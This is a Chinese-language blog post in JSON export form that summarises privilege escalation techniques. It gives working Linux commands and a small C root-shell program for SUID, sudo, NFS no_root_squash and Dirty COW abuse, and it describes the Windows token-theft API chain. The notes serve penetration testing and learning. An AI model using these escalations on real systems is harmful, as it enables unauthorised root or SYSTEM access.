{"title":"提权总结","slug":"PrivilegeEscalation","date":"2021-03-05T07:22:18.000Z","updated":"2021-03-07T03:19:36.270Z","comments":true,"path":"api/articles/PrivilegeEscalation.json","photos":[],"link":"","excerpt":" Linux常见的提权方法：1<br>2<br>3<br>4<br>suid提权<br>sudo提权     CVE-2021-3156     https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156<br>脏牛提权<br>NFS提权     <br>","covers":null,"content":"<h1 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\"></a> Linux</h1>\n<p>常见的提权方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">suid提权</span><br><span class=\"line\">sudo提权     CVE-2021-3156     https:&#x2F;&#x2F;github.com&#x2F;blasty&#x2F;CVE-2021-3156</span><br><span class=\"line\">脏牛提权</span><br><span class=\"line\">NFS提权     </span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h2 id=\"suid提权-sudo-与之提权同理sudo-l-查看无需密码命令\"><a class=\"markdownIt-Anchor\" href=\"#suid提权-sudo-与之提权同理sudo-l-查看无需密码命令\"></a> suid提权 (sudo 与之提权同理，sudo -l 查看无需密码命令)</h2>\n<p>​\t原理：suid是Linux文件系统的一种文件权限，简单的理解就是其可以由普通权限用户调用，而运行态下用户权限为高权限用户。如Linux中操作socket套接字需要root权限，而普通用户也常需要调用ping命令，因此ping就是一个常见的被赋予suid权限的程序。</p>\n<p>​\t常见并可被用于调用shell命令的有以下几个：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap</span><br><span class=\"line\">vim</span><br><span class=\"line\">find</span><br><span class=\"line\">more</span><br><span class=\"line\">less</span><br><span class=\"line\">nano</span><br><span class=\"line\">cp</span><br></pre></td></tr></table></figure>\n<p>​\t寻找具有suid权限的命令：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class=\"line\">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class=\"line\">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>\n<h3 id=\"nmap\"><a class=\"markdownIt-Anchor\" href=\"#nmap\"></a> nmap</h3>\n<p>​\tnmap 版本在 2.02~ 5.21中带有交互模式，用户可以利用此执行shell命令，但这个版本过于古老，实际情况中难以遇到，仅在此记录一下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -V</span><br></pre></td></tr></table></figure>\n<h3 id=\"find\"><a class=\"markdownIt-Anchor\" href=\"#find\"></a> find</h3>\n<p>find 可使用-exec参数执行命令，复现如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~ via 🐍 v3.7.6 </span><br><span class=\"line\">❯ sudo chmod +s &#x2F;bin&#x2F;find </span><br><span class=\"line\"></span><br><span class=\"line\">~ via 🐍 v3.7.6 </span><br><span class=\"line\">❯ &#x2F;usr&#x2F;bin&#x2F;find &#x2F;bin&#x2F;bash -exec whoami \\;</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n<h3 id=\"vim\"><a class=\"markdownIt-Anchor\" href=\"#vim\"></a> vim</h3>\n<p>vim也可以执行shell命令：（另外，vim也可以用来修改/etc/passwd文件）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~ via 🐍 v3.7.6 </span><br><span class=\"line\">❯ vim test  </span><br><span class=\"line\">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class=\"line\">:shell</span><br><span class=\"line\">b0ring# id</span><br><span class=\"line\">用户id&#x3D;1000(b0ring) 组id&#x3D;985(users) 有效用户id&#x3D;0(root) 有效组id&#x3D;0(root) 组&#x3D;0(root),985(users)</span><br><span class=\"line\">b0ring# whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n<h3 id=\"cp\"><a class=\"markdownIt-Anchor\" href=\"#cp\"></a> cp</h3>\n<p>若cp存在suid，那么可以使用cp来把原来的/etc/passwd文件覆盖，从而修改用户的uid。</p>\n<h2 id=\"nfs提权\"><a class=\"markdownIt-Anchor\" href=\"#nfs提权\"></a> NFS提权</h2>\n<p>前提条件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">被攻击机开启了NFS服务</span><br><span class=\"line\">启动设置中开启了no_root_sqaush</span><br><span class=\"line\">已获取低权限shell</span><br></pre></td></tr></table></figure>\n<p>原理：当nfs开启了no_root_sqaush选项时（低版本中默认no_root_sqaush），其他主机使用root登录可伪造文件的所有者，添加suid后，其利用原理与suid相同。</p>\n<p>搭建nfs参考：<a href=\"https://blog.csdn.net/u011418530/article/details/89307874%EF%BC%88%E6%B3%A8%E6%84%8F%E6%B7%BB%E5%8A%A0no_root_sqaush%EF%BC%89\">https://blog.csdn.net/u011418530/article/details/89307874（注意添加no_root_sqaush）</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;mnt </span><br><span class=\"line\">❯ vim test.c</span><br><span class=\"line\">#include &lt;stdio.h&gt; </span><br><span class=\"line\">#include &lt;stdlib.h&gt; </span><br><span class=\"line\">#include &lt;sys&#x2F;types.h&gt; </span><br><span class=\"line\">#include &lt;unistd.h&gt; </span><br><span class=\"line\">int main() &#123; setgid(0); setuid(0); system(&quot;&#x2F;bin&#x2F;bash&quot;); return 0; &#125;</span><br><span class=\"line\">&#x2F;mnt </span><br><span class=\"line\">❯ gcc test.c                                             </span><br><span class=\"line\">&#x2F;mnt </span><br><span class=\"line\">❯ sudo chown root:root a.out  </span><br><span class=\"line\">&#x2F;mnt </span><br><span class=\"line\">❯ sudo chmod +s a.out</span><br></pre></td></tr></table></figure>\n<p>然后使用低权限主机直接运行a.out文件，即可获得root权限：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ~ &#x2F;tmp&#x2F;a.out                                                 </span><br><span class=\"line\">root@ubuntu:~# id</span><br><span class=\"line\">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(b0ring)</span><br></pre></td></tr></table></figure>\n<h2 id=\"脏牛提权\"><a class=\"markdownIt-Anchor\" href=\"#脏牛提权\"></a> 脏牛提权</h2>\n<p>原理：<br />\nlinux内核的子系统在处理写入时复制至产生了竞争条件，恶意用户可利用此漏洞来获取高权限，对只读内存映射进行访问。</p>\n<p>竞争条件，指的是任务执行顺序异常，可导致应用奔溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获取到root权限。</p>\n<p>poc：</p>\n<p><a href=\"https://github.com/FireFart/dirtycow\">https://github.com/FireFart/dirtycow</a></p>\n<h1 id=\"windows\"><a class=\"markdownIt-Anchor\" href=\"#windows\"></a> Windows</h1>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UDF、bypassUAC、令牌窃取、土豆提权、错误配置</span><br></pre></td></tr></table></figure>\n<h2 id=\"令牌窃取\"><a class=\"markdownIt-Anchor\" href=\"#令牌窃取\"></a> 令牌窃取</h2>\n<p>参考文献：<a href=\"https://www.anquanke.com/post/id/187895#h2-7\">https://www.anquanke.com/post/id/187895#h2-7</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">窃取进程token的条件：</span><br><span class=\"line\">当前用户必须是该进程的TokenOwner</span><br></pre></td></tr></table></figure>\n<p>窃取流程：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OpenProcess\t-&gt; OpenProcessToken -&gt; ImpersonateLoggedOnUser</span><br><span class=\"line\">OpenProcess\t-&gt; OpenProcessToken -&gt; DuplicateTokenEx -&gt; CreateProcessWithTokenW</span><br></pre></td></tr></table></figure>\n<h3 id=\"openprocess\"><a class=\"markdownIt-Anchor\" href=\"#openprocess\"></a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess\">OpenProcess</a></h3>\n<p>​\tOpenProcess以PID为参数输入，返回一个句柄。调用该参数必须有SeDebugPrivilege权限。（Administrator一般都有，其他用户必须授予该权限才可以，<a href=\"https://medium.com/palantir/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e\">参考</a>）</p>\n<p>​\tOpenProcess必须使用PROCESS_QUERY_INFORMATION和PROCESS_QUERY_LIMITED_INFORMATION 或者 PROCESS_ALL_ACCESS访问权限，才能在使用OpenProcessToken时返回进程的句柄。</p>\n<h3 id=\"openprocesstoken\"><a class=\"markdownIt-Anchor\" href=\"#openprocesstoken\"></a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken\">OpenProcessToken</a></h3>\n<p>​\tOpenProcessToken以进程的句柄为输入，返回与进程相关的token句柄。</p>\n<p>​\t如果OpenProcessToken与ImpersonateLoggedOnUser配合，必须使用TOKEN_QUERY和TOKEN_DUPLICATE权限打开句柄。</p>\n<p>​\t如果OpenProcessToken与DuplicateTokenEx配合，只需要使用TOKEN_DUPLICATE权限。</p>\n<h3 id=\"impersonateloggedonuser\"><a class=\"markdownIt-Anchor\" href=\"#impersonateloggedonuser\"></a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser\">ImpersonateLoggedOnUser</a></h3>\n<p>​\tImpersonateLoggedOnUser以token句柄为输入，用来模仿该token所代表用户的权限进行操作，直到进程退出或调用RevertToSelf函数之前，该进程始终将以该token的权限运行。</p>\n<p>​\t调用该函数，满足下面条件之一即可：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 所使用token权限低于当前用户</span><br><span class=\"line\">2. 调用者拥有SeImpersonatePrivilege权限</span><br><span class=\"line\">3. 认证标识与调用者权限相同</span><br></pre></td></tr></table></figure>\n<h3 id=\"duplicatetokenex\"><a class=\"markdownIt-Anchor\" href=\"#duplicatetokenex\"></a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex\">DuplicateTokenEx</a></h3>\n<p>​\tDuplicateTokenEx以token句柄为输入，创建新的token，调用其时必须使用TOKEN_ADJUST_DEFAULT、TOKEN_ADJUST_SESSIONID、TOKEN_QUERY、TOKEN_DUPLICATE以及TOKEN_ASSIGN_PRIMARY权限。</p>\n<p>​\tDuplicateTokenEx创建的新token可以传入CreateProcessWithTokenW函数，用以创建新的进程。</p>\n<h3 id=\"createprocesswithtokenw\"><a class=\"markdownIt-Anchor\" href=\"#createprocesswithtokenw\"></a> <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw\">CreateProcessWithTokenW</a></h3>\n<p>​\tCreateProcessWithTokenW以token为输入，创建一个新的进程。</p>\n<h3 id=\"利用winlogonexe提升至system权限\"><a class=\"markdownIt-Anchor\" href=\"#利用winlogonexe提升至system权限\"></a> 利用winlogon.exe提升至SYSTEM权限</h3>\n<p>​\t此前，Nick Landers介绍了使用上述流程利用winlogon.exe窃取token的<a href=\"https://blog.xpnsec.com/becoming-system/\">方法</a>。</p>\n<h3 id=\"使用其他进程提升至system权限\"><a class=\"markdownIt-Anchor\" href=\"#使用其他进程提升至system权限\"></a> 使用其他进程提升至SYSTEM权限</h3>\n<p>​\t其他代替进程必须满足以下条件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 进程权限必须是SYSTEM权限</span><br><span class=\"line\">2. TokenOwner必须是当前用户</span><br><span class=\"line\">3. 当前用户至少是Administrator</span><br><span class=\"line\">4. 若进程受PPL（Protected Process Light）保护，则必须使用PROCESS_QUERY_LIMITED_INFORMATION访问权限来调用</span><br></pre></td></tr></table></figure>\n<h2 id=\"未完待续\"><a class=\"markdownIt-Anchor\" href=\"#未完待续\"></a> 未完待续……</h2>\n","categories":[],"tags":[{"name":"渗透","slug":"渗透","count":1,"path":"api/tags/渗透.json"}]}